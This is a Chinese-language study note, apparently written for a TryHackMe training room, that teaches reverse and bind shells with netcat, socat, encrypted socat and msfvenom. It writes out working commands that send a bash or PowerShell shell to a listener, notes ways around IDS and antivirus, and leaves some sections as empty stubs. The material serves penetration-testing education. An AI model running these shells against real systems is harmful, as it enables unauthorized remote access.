# Privilege Escalation 特权升级

## What the shell？

在我们深入了解发送和接收 shell 的复杂性之前，了解 shell 实际上是什么很重要。用最简单的术语来说，shell 就是我们在与命令行环境 (CLI) 交互时使用的工具。换句话说，Linux中常见的 bash 或 sh 程序都是 shell 的示例，Windows 中的 cmd.exe 和 Powershell 也是如此。当以远程系统为目标时，有时可以强制运行在服务器（例如网络服务器）上的应用程序执行任意代码。发生这种情况时，我们希望使用此初始访问权限来获取在目标上运行的 shell。

简单来说，我们可以强制远程服务器向我们发送对服务器的命令行访问（反向shell），或者在我们可以连接的服务器上打开一个端口以执行更多命令（绑定shell） ).

我们将在整个会议室中更详细地介绍这两种情况。

这个房间的格式如下：

房间的大部分由信息组成，代码块和屏幕截图中给出了示例。
在房间的最后两个任务中有两个 VM——一个Linux ，一个 Windows。这些可以用来练习演示的技术。
任务 13 中有示例练习题。请随意完成这些练习，或者在完成任务时跟随任务。
话不多说，让我们开始吧！

## Tools

我们将使用多种工具来接收反向 shell 和发送绑定 shell。一般而言，我们需要恶意 shell 代码，以及与生成的 shell 交互的方法。我们将在下面简要讨论其中的每一个：



网猫：

Netcat 是传统的网络“瑞士军刀”。它用于手动执行各种网络交互，包括在枚举期间抓取横幅之类的东西，但对于我们的使用来说更重要的是，它可以用于接收反向 shell 并连接到连接到目标系统上绑定 shell 的远程端口。默认情况下，Netcat shell 非常不稳定（容易丢失），但可以通过我们将在即将到来的任务中介绍的技术进行改进。

索卡特：

Socat 就像类固醇上的 netcat。它可以做所有相同的事情，甚至更多。Socat shell 通常比开箱即用的 netcat shell 更稳定。从这个意义上说，它远远优于 netcat；但是，有两个重要问题：

语法比较难
默认情况下，几乎每个Linux发行版都安装了 Netcat 。默认情况下很少安装 Socat。
这两个问题都有解决方法，我们将在后面介绍。

Socat 和 Netcat 都有用于 Windows 的 .exe 版本。

Metasploit——多/处理程序：

Metasploit 框架的模块exploit/multi/handler与 socat 和 netcat 一样，用于接收反向 shell。由于是 Metasploit 框架的一部分，multi/handler 提供了一种成熟的方式来获取稳定的 shell，并提供了多种进一步的选项来改进捕获的 shell。它也是与meterpreter shell 交互的唯一方式，也是处理分阶段有效载荷的最简单方式——我们将在任务 9 中查看这两种方式。

Msfvenom：

与 multi/handler 一样，msfvenom 在技术上是 Metasploit 框架的一部分，但是，它作为独立工具提供。Msfvenom 用于动态生成有效载荷。虽然 msfvenom 可以生成除反向和绑定 shell 之外的有效负载，但这些是我们将在本会议室中重点关注的内容。Msfvenom 是一个非常强大的工具，因此我们将在专门的任务中更详细地介绍它的应用程序。

除了我们已经介绍过的工具之外，还有许多不同语言的一些 shell 存储库。其中最突出的一个是Payloads all the Things。PentestMonkey Reverse Shell Cheatsheet也很常用。除了这些在线资源，Kali Linux还预装了位于/usr/share/webshells. SecLists存储库虽然主要用于单词列表，但也包含一些用于获取 shell 的非常有用的代码。



## type of shell

在高层次上，我们对利用目标的两种 shell 感兴趣：反向 shell 和绑定 shell。

反向 shell是指目标被迫执行连接回您的计算机的代码。在您自己的计算机上，您可以使用上一个任务中提到的工具之一来设置用于接收连接的侦听器。反向 shell 是绕过防火墙规则的好方法，防火墙规则可能会阻止您连接到目标上的任意端口；然而，缺点是，当通过 Internet 从一台机器接收 shell 时，您需要配置自己的网络以接受 shell。但是，由于我们连接到网络的方法，这在 TryHackMe 网络上不会成为问题。

绑定 shell是指在目标上执行的代码用于启动直接在目标上附加到 shell 的侦听器。然后这将向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得远程代码执行。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。
作为一般规则，反向 shell 更容易执行和调试，但是，我们将在下面介绍这两个示例。不要太担心这里的语法：我们将在接下来的任务中查看它。请注意以下模拟中反向和绑定 shell 之间的区别。

reverse shell

```
sudo nc -lvnp 443   #attacking machine
nc <local-ip> <port> -e /bin/bash #victim machine
```

bind shell  不常见

```
nc -lvnp <port> -e "cmd.exe"  #victim machine
nc machine-ip <port>        #attacking machine
```

挖个坑：反向shell和正向shell的区别

## netcat

reverse shell

```
nc -lvnp <port-number>

-l 用于告诉 netcat 这将是一个监听器
-v 用于请求详细输出
-n 告诉 netcat 不解析主机名或使用 DNS。对此进行解释超出了会议室的范围。
-p 表示将遵循端口规范。
```

示例使用端口 443。实际上，您可以使用任何您喜欢的端口，只要还没有服务使用它即可。请注意，如果您选择使用低于 1024 的端口，则需要sudo在启动侦听器时使用。也就是说，使用众所周知的端口号（80、443 或 53 是不错的选择）通常是个好主意，因为这更有可能通过目标上的出站防火墙规则。



bind  shell

如果我们希望在目标上获得绑定 shell，那么我们可以假设已经有一个侦听器在目标的选定端口上等待我们：我们需要做的就是连接到它。其语法相对简单：

```
nc <target-ip> <chosen-port>
```

在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。



## netcat shell 稳定性





技术1：python

我们要讨论的第一种技术仅适用于 Linux 机器，因为它们几乎总是默认安装 Python。这是一个三阶段过程：

1.



技术2：rlwrap

rlwrap 是一个程序，简单来说，它使我们能够在收到 shell 后立即访问历史记录、制表符自动完成和箭头键；但是，如果您希望能够在 shell 中使用 Ctrl + C，则仍然必须使用一些手动稳定。Kali 默认没有安装 rlwrap，所以先用sudo apt install rlwrap.

要使用 rlwrap，我们调用一个稍微不同的侦听器：

rlwrap nc -lvnp <port>

在我们的 netcat 侦听器前面加上“rlwrap”可以为我们提供一个功能更齐全的 shell。这种技术在处理 Windows shell 时特别有用，否则众所周知难以稳定。在处理 Linux 目标时，可以使用与之前技术的第三步中相同的技巧来完全稳定：使用 Ctrl + Z 将 shell 背景化，然后使用稳定并重新stty raw -echo; fg进入 shell。



技术3： Socat



## Socat

Socat 在某些方面与 netcat 相似，但在许多其他方面有根本的不同。考虑 socat 的最简单方法是将其作为两点之间的连接器。为了这个房间的利益，这基本上是一个监听端口和键盘，但是，它也可以是一个监听端口和一个文件，或者实际上是两个监听端口。socat 所做的只是提供两点之间的链接——很像 Portal 游戏中的 portal gun！c

如前所述，socat 的语法比 netcat 的语法难得多。下面是 socat 中基本反向 shell 侦听器的语法：

```
socat TCP-L:<port> -
```

与 socat 一样，这需要两个点（监听端口和标准输入) 并将它们连接在一起。生成的 shell 不稳定，但这可以在 Linux 或 Windows 上运行，并且等效于nc -lvnp <port>.

在 Windows 上，我们将使用此命令进行回连：

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

“pipes”选项用于强制 powershell（或 cmd.exe）使用 Unix 风格的标准输入和输出

这是 Linux 目标的等效命令：

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```



## Socat Encrypted Shells （加密shell）

socat 的众多优点之一是它能够创建加密的 shell —— 绑定和反向。我们为什么要这样做？除非您拥有解密密钥，否则无法监视加密的外壳，因此通常能够绕过 IDS。
我们首先需要生成证书才能使用加密的 shell。这在我们的攻击机器上最容易做到：

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

此命令创建一个 2048 位 RSA 密钥和匹配的证书文件，自签名，有效期不到一年。当您运行此命令时，它会要求您填写有关证书的信息。这可以留空，或随机填充。然后我们需要将两个创建的文件合并为一个.pem文件

```
cat shell.key shell.crt > shell.pem
```

现在，当我们设置我们的反向 shell 侦听器时，我们使用：

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

这将使用我们生成的证书设置一个 OPENSSL 侦听器。verify=0告诉连接不要费心尝试验证我们的证书是否已由公认的权威机构正确签名。请注意，必须在正在侦听的任何设备上使用该证书。如果是bind shell那证书就在目标机器上生成并合并。



要返回连接，我们将使用：

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

现在，换成是bind shell，来看看是什么样的命令

目标

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

攻击机

```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

再次注意，即使对于 Windows 目标，证书也必须与侦听器一起使用，因此需要为绑定 shell 复制 PEM 文件。



socat命令阶段性总结

```
reverse shell
socat TCP-L:<port> -

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes  #for Windows
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"     # for linux

----------------------------------------------------------------------------------------------------
socat TCP-L:<port> FILE:`tty`,raw,echo=0 #增加了稳定性和交互性
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
socat TCP:<attacker-ip>:<attacker-port> EXEC:powershell.exe,pipes,pty,stderr,sigint,setsid,sane

----------------------------------------------------------------------------------------------------
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0 #稳定、交互、加密

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash,pty,stderr,sigint,setsid,sane

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0
EXEC:powershell.exe,pipes,pty,stderr,sigint,setsid,sane

----------------------------------------------------------------------------------------------------
bind shell

socat TCP-L:<PORT> EXEC:powershell.exe,pipes
socat TCP-L:<PORT> EXEC:/bin/bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
----------------------------------------------------------------------------------------------------
socat TCP-L:<PORT> EXEC:powershell.exe,pipes,pty,stderr,sigint,setsid,sane
socat TCP-L:<PORT> EXEC:/bin/bash,pty,stderr,sigint,setsid,sane

socat TCP:<TARGET-IP>:<TARGET-PORT>  FILE:`tty`,raw,echo=0
----------------------------------------------------------------------------------------------------
socat OPENSSL:<PORT>,cert=shell.pem,verify=0  EXEC:/bin/bash,pty,stderr,sigint,setsid,sane
socat OPENSSL:<PORT>,cert=shell.pem,verify=0  EXEC:powershell.exe,pipes,pty,stderr,sigint,setsid,sane

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>，verify=0  FILE:`tty`,raw,echo=0

```

## 常见的shell有效载荷

对于其他常见的反向 shell 有效负载，PayloadsAllTheThings是一个存储库，其中包含多种不同语言的 shell 代码（通常是用于复制和粘贴的单行格式）。阅读链接页面以查看可用内容非常值得。





##  msfvenom

msfvenom 的标准语法如下：

```
msfvenom -p <PAYLOAD> <OPTIONS>
```

例如，要生成 exe 格式的 Windows x64 反向 Shell，我们可以使用：

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

-f <格式>      指定输出格式。在这种情况下，它是一个可执行文件 (exe)

-o <文件>   生成的负载的输出位置和文件名。

LHOST= <IP>   指定要连接回的 IP。

LPORT= <端口>  要连接回的本地计算机上的端口。这可以是 0 到 65535 之间尚未使用的任何值；但是，低于 1024 的端口是受限的，需要以 root 权限运行的侦听器。



分阶段与无阶段

在我们继续之前，必须介绍另外两个概念：分阶段反向 shell 有效载荷和无阶段反向 shell 有效载荷。

分阶段有效载荷分两部分发送。第一部分称为stager。这是一段直接在服务器本身上执行的代码。它连接回等待的侦听器，但实际上本身并不包含任何反向 shell 代码。相反，它连接到侦听器并使用连接加载真正的有效载荷，直接执行它并防止它接触磁盘，否则传统的反病毒解决方案可能会捕获它。因此，有效载荷被分成两部分——一个小的初始阶段，然后是在阶段被激活时下载的更大的反向 shell 代码。分阶段的有效负载需要一个特殊的侦听器——通常是 Metasploit multi/handler，这将在下一个任务中介绍。
无阶段有效载荷更为常见——这些是我们迄今为止一直在使用的。它们是完全独立的，因为有一段代码在执行时会立即将 shell 发送回等待的侦听器。
无阶段有效载荷往往更易于使用和捕获；但是，它们也比较笨重，并且更容易被防病毒或入侵检测程序发现和删除。分阶段有效载荷更难使用，但初始阶段要短得多，有时会被效率较低的防病毒软件遗漏。现代防病毒解决方案还将利用反恶意软件扫描接口 (AMSI) 来检测由 stager 加载到内存中的有效负载，从而使分阶段的有效负载在该区域的效率不如以前。



有效载荷命名约定

使用 msfvenom 时，了解命名系统的工作原理很重要。基本约定如下：

```
<OS>/<arch>/<payload>
```

例如：

```
linux/x86/shell_reverse_tcp
```

这将为 x86 Linux目标生成一个无阶段的反向 shell 。

此约定的例外是 Windows 32 位目标。对于这些，没有指定拱门。例如：

```
windows/shell_reverse_tcp
```


对于 64 位 Windows 目标，arch 将被指定为正常 (x64)。

让我们进一步分解有效负载部分。

在上面的示例中，使用的有效负载是shell_reverse_tcp. 这表明它是无阶段有效载荷。如何？无阶段有效载荷用下划线 ( ) 表示_。与此有效负载等效的阶段是：
shell/reverse_tcp

由于分阶段有效载荷用另一个正斜杠 ( ) 表示/。

此规则也适用于 Meterpreter 负载。一个 Windows 64 位分阶段的 Meterpreter 负载看起来像这样：

windows/x64/meterpreter/reverse_tcp

Linux 32 位无阶段 Meterpreter有效负载如下所示：

linux/x86/meterpreter_reverse_tcp